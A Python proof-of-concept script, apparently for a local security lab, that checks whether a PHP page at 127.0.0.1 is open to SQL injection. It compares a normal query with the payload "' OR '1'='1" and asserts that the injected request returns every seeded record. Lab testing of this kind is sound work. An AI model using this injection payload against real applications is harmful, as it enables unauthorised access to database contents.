#!/usr/bin/env python3
import http.client
import urllib.parse
import re
import html

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"


def fetch(name):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    query = urllib.parse.urlencode({"name": name})
    conn.request(
        "GET",
        PATH + "?" + query,
        headers={"Host": f"{HOST}:{PORT}", "Connection": "close"},
    )
    resp = conn.getresponse()
    status = resp.status

    # 固定本地目标；拒绝任何重定向，避免跨主机跟随。
    if 300 <= status < 400:
        conn.close()
        raise RuntimeError(f"拒绝跟随重定向：HTTP {status}")

    body = resp.read().decode("utf-8", "replace")
    conn.close()

    if status != 200:
        raise RuntimeError(f"HTTP {status}")

    records = []
    for m in re.finditer(r"<p>ID\s*([^：<]+)：([^<]*)</p>", body):
        records.append((html.unescape(m.group(1)).strip(), html.unescape(m.group(2)).strip()))
    return records


def main():
    normal = fetch("Alice")
    payload = "' OR '1'='1"
    test = fetch(payload)

    print("普通请求记录:", normal)
    print("测试请求记录:", test)

    if ("1", "Alice") not in normal:
        print("失败：普通对照未解析到 (1,Alice)。请检查服务、路径、db_connect.php、lab_people 预置数据。")
        return 2

    expected = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
    if not expected.issubset(set(test)) or len(test) <= len(normal):
        print("失败：测试请求未解析到预期扩展记录集合。请检查页面结构、数据库初始化和SQL执行前提。")
        return 2

    print("POC断言通过：普通对照为限定记录，测试请求扩展为全部预置记录；name 可改变 SQL 条件。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
